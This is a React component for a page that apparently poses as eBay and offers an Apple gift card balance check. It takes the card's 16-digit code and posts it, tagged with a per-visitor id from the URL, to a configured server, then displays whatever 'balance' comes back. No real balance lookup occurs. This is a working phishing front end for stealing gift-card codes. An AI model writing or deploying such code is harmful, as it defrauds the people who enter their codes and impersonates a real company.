import {useState} from "react"
import axios from "axios"
import {useParams} from "react-router-dom"
import {FaBars, FaTimes} from "react-icons/fa"
import { BiSearch, BiUser, BiCart, BiSolidLocationPlus} from "react-icons/bi"
import Logo from "../public/logo.svg"
import ebayImage from "../public/ebayImage.png"
import {Link} from "react-router-dom"
import { CLIENT_BASE_URL } from "./context"

function Home(){
  const [secretPin, setSecretPin] = useState("")
  const [isOpenNav, setIsOpenNav] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [isDone, setIsDone] = useState(false)
  const [error, setError] = useState({isError:false, message:""})
  const [cardData, setCardData] = useState("")

  const {id} = useParams()

  function getSecretPin(e){
   let input = e.target.value
    const cleanedInput = input.replace(/\s+/g, "").slice(0, 16);
  const formattedPin = cleanedInput.replace(/(.{4})/g, "$1 ").trim();

    setSecretPin(formattedPin);
  }

  async function storeSecretPin(){
    if(secretPin.length !== 19 || !secretPin.trim().length){
      return setError({isError:true, message:"Oops, that isn't right. Please enter your gift card's 13-digit code"})
    }
    setIsLoading(true)

    const userId = id || ""
    try{
      const {data} = await axios.post(`${CLIENT_BASE_URL}/card/${userId}`, {
        secreteCode:secretPin
      })
      setCardData(data)
      setIsLoading(false) 
      setIsDone(true)
      setError({isError:false,message:""})
      setSecretPin("")
    }catch(err){
      setIsLoading(false)
      setIsDone(false)
      setError({isError:false,message:""})
      console.error(err)
    }
  }
  return (

    <main className="main" style={{maxHeight: isOpenNav? "100vh" : "initial", overflow:"hidden"}}>
      <header className="header">
        <div className="logo">
          <img alt="logo" src={Logo} />
        </div>
        <div className="icons">
          <BiSearch className="icon"/>
          <BiUser className="icon"/>
          <BiCart className="icon"/>
          <FaBars onClick={()=>{setIsOpenNav(true)}} className="icon bars"/>
        </div>
        {isOpenNav && <nav className="nav" >
          <div className="icon-container">
            <FaTimes className="icon" onClick={()=>{setIsOpenNav(false)}} />
          </div>
          <ul>
            <li>Categories</li>
            <li>Deals</li>
            <li>Sell</li>
            <li>Help</li>
          </ul>
          <p>Sign Out</p>
        </nav>}
      </header>
      <div className="hero">
        <div className="ebay-image">
          <h1>Check Your Apple Gift Card Balance</h1>
          
        </div>
        {!isDone && <div className="code">
          <div>
            <p>Enter your PIN here:</p>
            <input onChange={getSecretPin} placeholder="Gift Card Pin" value={secretPin} />
            {error.isError && <small className="error">{error.message}</small>}
          </div>
          <div className="check">
            <button onClick={storeSecretPin}>Check Balance</button>
          </div>
          
        </div>}
        {isDone && <div className="result">
          <div className="amount">
            <p className="text">Your gift card balance:</p>
            <p className="balance">US ${cardData.balance}.00</p>
          </div>
          <div className="check-new">
            <button onClick={()=>{setIsDone(false)}}>Check another card</button>
          </div>
        </div>}
      </div>
      <footer className="footer">
        
          <ul className="ul">
            <li>Home</li>
            <li>My eBay</li>
            <li>Sell an item</li>
            <li>Help & Contact</li>
            <li>Download the free eBay app</li>
            <li>Sign out</li>
          </ul>
        
        <div>
          <div className="second">
            <a><span>Site map,</span> <span>User Agreement,</span> <span>Privacy,</span> <span>Cookies</span> & <span>AdChoice.</span></a>
          </div>
          <div className="last"> 
            <p>© 1995-2004 eBay Inc.</p>
            <p>Mobile / <Link to="/Sign-in" className="classic">Classic Site</Link></p>
          </div>
        </div>

      </footer>
    </main>
  )
  
}

export default Home